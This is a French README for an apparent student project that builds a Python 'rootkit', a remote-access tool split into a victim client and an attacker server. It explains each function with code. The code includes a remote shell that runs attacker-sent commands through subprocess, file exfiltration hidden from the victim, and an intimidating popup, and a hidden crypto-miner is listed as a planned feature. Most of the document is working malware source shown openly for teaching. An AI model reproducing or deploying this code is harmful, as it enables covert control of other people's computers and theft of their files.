# Rootkit-Python-IPSSI

<!-- Image centrée -->

<div align="center">

![CAPTURE](https://zupimages.net/up/22/48/9z79.png)

</div>

<!-- --------------------------- -->


**Rootkit-Python-IPSSI** a été réalisé dans le cadre pédagogique de l'IPSSI avec un projet sur 1,5 jours. 

>Un rootkit est un package de logiciels malveillants conçu pour permettre à un intrus d'obtenir un accès non autorisé à un ordinateur ou à un réseau. **Il permet une exécution de code à distance.**

**Pour un meilleur confort, veuillez vous rendre sur https://github.com/IPSSI-Jean/Virus-Python-IPSSI pour avoir une vue globale sur le projet et sur l'affichage du README**


# Prérequis
- Visual studio code

- Python3

- Connaissances basique / intermédiaire en Python

Il est recommandé d'exécuter ce programme dans un environnement virtuel, il est possible d'en mettre un en place à l'aide des logiciels suivants : 
- Virtualbox --> Sur une VM Windows / Linux
- VMWare workstation pro --> Sur une VM Windows / Linux
- ...

# Description du projet

### Architecture du projet 

Le projet repose sur 2 fichiers Python et 1 fichier de test : 

- ```Client-Victime.py``` --> Qui contient le code client qui est a déployer sur la victime souhaitée qui écoute sur un port.

- ```Serveur-Attaquant.py``` --> Qui contient le code serveur ( attaquant ) qui ouvrira connection TCP.

- ```test.txt``` --> Pour tester l'exfiltration de fichiers.

### Fonctionnement du projet

Le projet se passe en plusieurs étapes :

1) Exécution du code sur la victime

2) Exécution du code sur le serveur ce qui initialise une connexion TCP entre le serveur et le client ( pour la victime, l'exécution est transparante )

3) Un shell sur le serveur attaquant s'ouvrira et permettra **de saisir des commandes**

Plusieurs commandes sont possibles depuis le serveur attaquant : 
- **shell** : Pour avoir accès au shell de la victime
- **exit** : Arrête le malware coté victime
- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
- **help** : Liste les commandes possibles

### Mise en réseau
Ce projet se déroule entièrement en **local**.

# Avancement du projet

- [x] Création du shell côté attaquant
- [x] Mise en place de l'exfiltration de fichiers de la victime
- [x] Mise en place de l'exécution du shell de la victime depuis l'attaquant
- [x] Mise en place d'une commande custom qui lance une POP-UP sur le client
- [ ] Amélioration de l'interface shell côté attaquant pour proposer une solution interactive 
- [ ] Mineur de cryptomonnaies en fond


### Mise en place de l'environement de travail

Il est conseillé, pour travailler dans de bonnes conditions, d’ouvrir un **répertoire de travail** ( sur le bureau ou autre ) sur Visual Studio Code

Une fois le répertoire créé, dans visual studio code il faut cliquer sur ```Fichier``` → ```Ouvrir le dossier```

Une fois cette étape réalisée il suffit d'importer les fichiers .py dans le répertoire de travail et l'exécution est désormait possible

# Explications sur le code

## Code serveur

### Fonctions de la partie serveur
L'objectif ici est de réunir les fonctions dans une classe, les classes sont un moyen de réunir des données et des fonctionnalités.

```python
class Shell:
    def...
```
Lors de la déinition des méthodes de classes, il est important d'indiquer explicitement **self** comme premier argument de chaque méthode, y compris **init**. Cela permet d'initialiser la classe

```python
def __init__(self, SHELL_PYTHON):
    self.SHELL_BT = SHELL_PYTHON
```
La première fonction **verification** permet de définir les commandes côté attaquant, afin de contrôler la victime, 

>Pour rappel il y a 4 commandes :
>- **shell** : Pour avoir accès au shell de la victime
>- **exit** : Arrête le malware coté victime
>- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
>- **help** : Liste les commandes possibles

```python
def verifications(SHELL_PYTHON):
    verifications = ["shell", "exit", "recv_archive", "help","popup"]
    #Shell : Pour avoir accès à la shell de la victime
    if(SHELL_PYTHON == verifications[0]):
        print("Exécution du shell côté client")
        while True:
            shell = Shell.command()
            if shell == "exit":
                break  
    #Exit : Pour arrêter le malware coté victime 
    if(SHELL_PYTHON == verifications[1]):
        print("Connexion fermée côté client")
        conn.send("exit".encode())
        conn.close()
        s.close()
        exit()
    #Recv archive : Pour télécharger des fichiers depuis la victime.
    if(verifications[2] in SHELL_PYTHON):
        print("Téléchargement des fichiers depuis la victime...")
        Shell.recv_archive(SHELL_PYTHON)
    if(not SHELL_PYTHON in verifications):
        if(verifications[2] in SHELL_PYTHON):
            return(" ")
    os.system(SHELL_PYTHON)
    print("\n")
    #Help : lister les commandes possibles
    if(SHELL_PYTHON == verifications[3]):
        print("help")
    #Popupclient : Affiche une popup sur l'ordinateur cible
    if(SHELL_PYTHON == verifications[4]):
        conn.send("popup".encode())
        print("Popup envoyée au client")
```

La seconde fonction **home** permet envoie l'instruction 'home' à la victime qui l'interprète avec une fonction dans son code, renverra en réponse le chemin du répertoire actuel via le socket conn.

```python
def home():
    conn.send("home".encode())
    HOME = conn.recv(1024).decode("latin1")
    return(HOME)
```

La troisième fonction **command** permet, dans l'ordre :

- De demander au code de la victime le répertoire actuel
- D'afficher un prompt à l'attaquant indiquant le répertoire d'exécution cible
- De vérifier si l'attaquant a saisi exit et retourne exit ce qui quittera le shell
- D'envoyer le mot command et attend 1 seconde
- D'envoyer la commmande saisie par l'attaquant
- De recevoir la réponse de la victime

```python
def command():
    # Demande au code de la victime le répertoire actuel
    HOME = Shell.home()
    # Afficher un prompt à l'attaquant indiquant le répertoire d'exécution cible
    SHELL = str(input("%s>> "%(HOME)))
    # Vérifier si l'attaquant a saisi exit et retourne exit ce qui quittera le shell
    if(SHELL == "exit"):
        SHELL = ""
        return("exit")
    # Envoyer le mot command et attend 1 seconde
    conn.send("command".encode())
    sleep(1)
    # Envoyer la commmande saisie par l'attaquant
    conn.send(SHELL.encode())
    # Recevoir la réponse de la victime
    print(conn.recv(1024).decode("latin1"))
```
La quatrième fonction **recv_archive** permet l'exfiltration de données :

```python
#Recv Archive Serveur
def recv_archive(data):
    #Exfiltration du fichier
    f = open (r"C:\Users\ADM_VM01\Desktop\TP2\FichierExfiltré.txt", 'wb')
    conn.send("rcv".encode())
    s.listen(1)
    #Téléchargement de ce dernier
    data = conn.recv(1024)
    f.write(data)
    f.close()
    print("Téléchargement terminé")
    conn.shutdown(2)
    conn.close()
```

### Traitement de la partie serveur
 
 La première partie du traitement permet de définir les paramètres de base du programme ( port d'écoute, IP ) et initialise également la connexion

```python
#Gestion des sockets pour la connexion réseau
IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))
s.listen(10)
conn, cliente = s.accept()
welcome = conn.recv(1024)
print(welcome.decode("latin1"))
```

La seconde partie du traitement permet d'initialiser le shell interactif avec l'utilisateur ( avec l'interfacing compris )

Lorsque ```CTRL+C``` est déclanché, cela coupe le shell.

```python
while True:
    try:
        shell_btnt = str(input("\033[31m\033[1m[Commande]\033[31m >>\033[1;32m "))
        print("")
        print("Commandes possibles : shell, exit, recv_archive, help, popup")
        print("")
        Shell.verifications(shell_btnt)
    except KeyboardInterrupt:
        conn.close()
        s.close()
        exit()
```

## Code client

### Fonctions de  la partie client 

L'objectif ici est de réunir les fonctions dans une classe, les classes sont un moyen de réunir des données et des fonctionnalités.

```python
class Client:
    def...
```

Lors de la déinition des méthodes de classes, il est important d'indiquer explicitement **self** comme premier argument de chaque méthode, y compris **init**. Cela permet d'initialiser la classe.

```python
def __init__(self, DATA):
    self.DATA = DATA
```
La première fonction **verification** permet d'exécuter les commandes côté victime.

>Pour rappel il y a 4 commandes :
>- **shell** : Pour avoir accès au shell de la victime
>- **exit** : Arrête le malware coté victime
>- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
>- **help** : Liste les commandes possibles

```python
def verifications(DATA):
    #Exécute les commandes
    if(DATA == str.encode("command")):
        command = s.recv(1024)
        Client.command(command.decode("latin1"))

    #Shell : Pour avoir accès à la shell de la victime
    if(DATA == str.encode("home")):
        s.send(os.getcwd().encode())

    #Exit : Pour arrêter le malware coté victime 
    if(DATA == str.encode("exit")):
        s.close()
        exit()
    #Recv archive : Pour télécharger des fichiers depuis la victime.
    if(DATA == str.encode("filesend")):
        Client.send_archive(DATA)
```

La première fonction **send_archive** permet d'envoyer les fichiers spécifiés par l'attaquant.

```python
    #Recv Archive Client
def send_archive(DATA):
    file = r"C:\Users\ADM_VM01\Documents\test.txt"
    filetosend = open(file, "rb")
    #Envoi des données
    data = filetosend.read(1024)
    print("Sending...")
    print(data)
    s.send(data)
    filetosend.close()
    s.send(b"DONE")
    print("Done Sending.")
    print(s.recv(1024))
    s.shutdown(2)
    s.close()
```

La troisième fonction **popupclient** permet l'affichage d'une popup côté client, l'action déclanché par l'attaquant. L'affichage se réalise 5 fois.

```python
    #Popupclient client
def popupclient(DATA):
    for i in range (5):
        messagebox.showerror("R O O T K I T", "J'ai le contrôle de votre PC")
```


La quatrième fonction **command** permet de traiter l'ordre envoyé par l'attaquant. DATA est renvoyé à l'attaquant.

```python
def command(DATA):
    sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE,
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = sub.stderr.read()+sub.stdout.read()
    s.send(output)
```

### Traitement de la partie client

 La première partie du traitement permet de définir les paramètres de base du programme ( port d'écoute, IP ) et initialise également la connexion avec confirmation.
```python
IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(PORT)))
s.send("Connexion établie avec le client.".encode("latin1"))
```

Permet d'initialiser la réception des mots envoyés par l'attaquant.

Lorsque ```CTRL+C``` est déclanché, cela coupe le shell.

```python
IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(PORT)))
s.send("\n".encode("latin1"))
s.send("Connexion établie avec le client.".encode("latin1"))
s.send("\n".encode("latin1"))
s.send("\n".encode("latin1"))
s.send("Commandes possibles : shell, exit, recv_archive, help, popup".encode("latin1"))
s.send("\n".encode("latin1"))
s.send("CTRL+C pour exit le shell".encode("latin1"))
s.send("\n".encode("latin1"))
```

# Auteur

Auteur du projet : Jean O.

Version stable : ```1.0```

# Licence

Ce projet est à but éducatif, il n'est soumis à aucune licences.
